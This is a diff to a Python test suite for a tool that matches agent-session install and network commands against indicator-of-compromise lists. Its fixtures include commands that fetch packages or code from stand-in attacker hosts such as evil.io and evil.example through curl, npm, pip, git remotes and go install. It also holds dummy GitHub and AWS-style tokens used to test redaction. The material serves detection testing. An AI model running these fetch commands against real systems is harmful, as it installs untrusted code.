@@ -586,8 +586,8 @@ class TestMatching(FleetCase, unittest.TestCase):
         f = self.fleet("npm:zzz\n", "npm ci", "pip install -r r.txt", "curl $U", "git pull origin",
                        "npm i x", "curl https://a.io/x", "brew tap o/r", "go get github.com/o/m@v1.0.0")
         t = f.ioc_totals
-        self.assertEqual(t["items_not_checkable"], {"lockfile": 2, "no_host": 2, "other": 1})
-        self.assertEqual(t["items_checked"], 3)
+        self.assertEqual(t["items_not_checkable"], {"lockfile": 2, "no_host": 2, "other": 0})
+        self.assertEqual(t["items_checked"], 4)          # brew tap names a URL: checkable (I2)
         self.assertEqual(t["items_checked"] + sum(t["items_not_checkable"].values()), len(f.network_items))
 
     def test_without_ioc_nothing_happens(self):
@@ -685,7 +685,7 @@ class TestLoaderCaps(IocFiles, unittest.TestCase):
     def bounded(self, r, seconds=2.0, mb=64):
         # 2 s is the dev-Mac budget. A shared CI runner gets the spec's loose
         # ceiling (section 11) so a slow neighbour cannot flake the suite.
-        self.assertLess(r["dt"], seconds if not os.environ.get("CI") else 10.0, r)
+        self.assertLess(r["dt"], max(seconds, 10.0) if os.environ.get("CI") else seconds, r)
         self.assertLess(r["mb"], mb, r)
 
     def test_oversized_file(self):
@@ -719,11 +719,24 @@ class TestLoaderCaps(IocFiles, unittest.TestCase):
                 self.bounded(r)
                 self.assertIn("nested", r["err"])
 
+    def test_the_entry_cap(self):
+        """The cap's semantics at a patched size: the entry past it exits 2,
+        across files, and memory is O(entries)."""
+        a = self.write("".join(f"npm:p{i}\n" for i in range(15_000)), "a.txt")
+        b = self.write("".join(f"npm:q{i}\n" for i in range(5_001)), "b.txt")
+        r = self.child(a, b, patch="IOC_ENTRIES_MAX=20000")
+        self.assertIn("b.txt line 5001: over", r["err"])
+        self.assertIn("entries; split by ecosystem", r["err"])
+        self.bounded(r, mb=64)
+        r = self.child(a, patch="IOC_ENTRIES_MAX=20000")
+        self.assertIsNone(r["err"])
+
+    @unittest.skipUnless(os.environ.get("ACTUALIS_SLOW_TESTS"), "set ACTUALIS_SLOW_TESTS=1 for the 1M-entry run")
     def test_a_million_entries(self):
         path = self.write("".join(f"npm:p{i}\n" for i in range(af.IOC_ENTRIES_MAX + 1)), "million.txt")
         r = self.child(path)
         self.assertIn("over 1,000,000 entries", r["err"])
-        self.bounded(r, mb=1024)                     # O(entries): the cap is the bound
+        self.bounded(r, seconds=10.0, mb=1024)       # O(entries): the cap is the bound
 
     def test_long_versions(self):
         self.fails("npm:x@=" + "1" * 10_000 + "\n", "over 128")
@@ -811,6 +824,19 @@ class TestBypassMatrix(FleetCase, unittest.TestCase):
         ("host:=evil.io", "curl https://evil.io/x", "match"),
         ("host:evil.io", "npm i --registry https://evil.io x", "match"),
         ("host:evil.io", "pip install -i https://evil.io/simple x", "match"),
+        # I1: a Go package inside a listed module
+        ("go:evil.example/m@<v1.4.2", "go install evil.example/m/cmd/x@v1.0.0", "match"),
+        ("go:evil.example/m", "go install evil.example/m/cmd/x@v1.0.0", "match"),
+        ("go:evil.example/m@<v1.4.2", "go install evil.example/m/cmd/x@latest", "unresolved"),
+        ("go:evil.example/m@<v1.4.2", "go get evil.example/m/sub@v1.0.0", "match"),
+        ("go:evil.example/m@<v1.4.2", "go get evil.example/m/sub@v2.0.0", None),
+        ("go:evil.example/m", "go get evil.example/mother/x@v1.0.0", None),
+        # I2: a host the session named, reached through a remote or brew tap
+        ("host:evil.io", "git remote add up https://evil.io/r.git && git pull up", "match"),
+        ("host:evil.io", "git remote add up https://evil.io/r.git && git fetch up", "match"),
+        ("host:evil.io", "git remote set-url origin https://evil.io/r.git; git pull", "match"),
+        ("host:github.com/evil", "brew tap evil/x", "match"),
+        ("host:registry.npmjs.org", "npm i x", None),
     ]
 
     def test_ioc_bypass_matrix(self):
@@ -821,6 +847,30 @@ class TestBypassMatrix(FleetCase, unittest.TestCase):
                 self.assertEqual(got, want, (line, cmd, f.ioc_rows and f.ioc_rows[0]["reason"]))
                 if want is not None:
                     self.assertEqual(f.ioc_totals["clean_name_matches"], 0)
+
+    def test_go_module_prefix_reason(self):
+        rec = osv("evil.example/m", "Go", ranges=[rng(("introduced", "0"), ("fixed", "not!a!version"))])
+        self.assertEqual(self.verdict(json.dumps(rec), "go install evil.example/m/cmd/x@v1.0.0", ioc_name="o.json"),
+                         ("unresolved", "module-prefix"))
+        f = self.fleet("go:evil.example/m@<v1.4.2\n", "go install evil.example/m/cmd/x@v1.0.0")
+        self.assertEqual(self.ioc_flags(f)[0]["program"], "go:evil.example/m@v1.0.0")
+
+    def test_alias_after_its_target(self):                              # I3
+        f = self.fleet("npm:x\n", "npm i evil@1.0.0", "npm i x@npm:evil@1.0.0")
+        self.assertEqual([(r["verdict"], r["item"]["alias"]) for r in f.ioc_rows], [("match", "x")])
+
+    def test_matching_reads_only_the_shared_fields(self):               # I3
+        ioc = self.load("npm:x\nnpm:evil@=1.0.0\nhost:evil.io\ngo:evil.example/m\npypi:p\n")
+        cmds = ["npm i x@npm:evil@1.0.0", "npm i evil@1.0.0", "curl https://evil.io/a",
+                "go get evil.example/m/x@v1.0.0", "pip install p==1", "npm i github:o/x",
+                "git clone https://evil.io/r && git pull", "npm i --registry https://evil.io x"]
+        f = af.Fleet()
+        f.suppressions = {}
+        for c in cmds:
+            f.add_tool("p", "Bash", {"command": c}, TS, "auto")
+        for item in f.network:
+            view = {k: item.get(k) for k in af.IOC_ITEM_FIELDS}
+            self.assertEqual(af.match_ioc(view, ioc), af.match_ioc(item, ioc), item)
 
     def test_refused_is_listed_never_clean(self):
         f = self.fleet("npm:evil\n", "npm i evil@1.0.0", refuse=[0])
@@ -1335,3 +1385,36 @@ class TestErrorMessagesAreClean(IocFiles, unittest.TestCase):
                 for lo, hi, why in af._STRIPPED_RANGES:
                     for ch in str(cm.exception):
                         self.assertFalse(lo <= ord(ch) <= hi, f"U+{ord(ch):04X} ({why}): {cm.exception!r}")
+
+
+class TestReviewFixes(FleetCase, unittest.TestCase):
+    """Wave D review: M1 (versions redacted), M3 (quotes clipped), M4 (counted)."""
+    GHP = "ghp_" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"
+    AKIA = "AKIA" + "Q7XK3M9PZ2LW8RT4"
+
+    def test_a_credential_in_a_version_is_redacted(self):              # M1
+        f = self.fleet("pypi:evilpkg\ngo:a.io/m@<v9.0.0\n", f"pip install evilpkg=={self.GHP}",
+                       f"go get a.io/m@{self.AKIA}")
+        outs = [json.dumps(af.to_json(f)), text_of(lambda: af.render(f, af.C(False), False, 12))]
+        outs.append(json.dumps(f.flags))
+        for text in outs:
+            self.assertNotIn(self.GHP, text)
+            self.assertNotIn(self.AKIA, text)
+        self.assertEqual(len(f.ioc_rows), 2)
+
+    def test_a_normal_version_keeps_its_flag_id(self):                  # M1
+        f = self.fleet("pypi:evilpkg\n", "pip install evilpkg==1.0")
+        self.assertEqual(self.ioc_flags(f)[0]["id"], af.flag_id("high", ["network-ioc"], "pypi:evilpkg@1.0"))
+
+    def test_quoted_tokens_are_clipped(self):                           # M3
+        for content in ("npm:" + "A" * 500_000 + "!\n", "npm:x " + "b" * 800_000 + "\n",
+                        "npm:x@" + "1." * 60 + "x\n", "zz" + "q" * 5000 + ":x\n"):
+            with self.subTest(n=len(content)):
+                with self.assertRaises(ValueError) as cm:
+                    self.load(content)
+                self.assertLess(len(str(cm.exception)), 400, str(cm.exception)[:200])
+
+    def test_unparseable_events_are_counted(self):                      # M4
+        ioc = self.load(json.dumps(osv("x", "PyPI", ranges=[rng(("introduced", "1.0"), ("fixed", "not-a-version"),
+                                                                kind="ECOSYSTEM")])), "o.json")
+        self.assertEqual((ioc.sources[0]["skipped_ranges"], only(ioc).spec_text), (1, "undecidable"))
